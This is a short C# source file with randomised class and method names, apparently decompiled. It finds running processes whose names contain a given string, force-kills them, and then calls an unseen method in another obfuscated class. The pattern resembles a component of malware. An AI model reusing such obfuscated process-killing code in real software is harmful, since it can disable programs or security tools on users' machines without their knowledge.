using System;
using System.Diagnostics;

namespace VyjVuXvolaw;

public sealed class vjjopyWMNHC
{
	public static bool dTTlrnHUpIY(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void YWzFWDGGKMXv(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (dTTlrnHUpIY(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					CRZFkRWzfSXjW.xcaeYZPGZgKKc();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
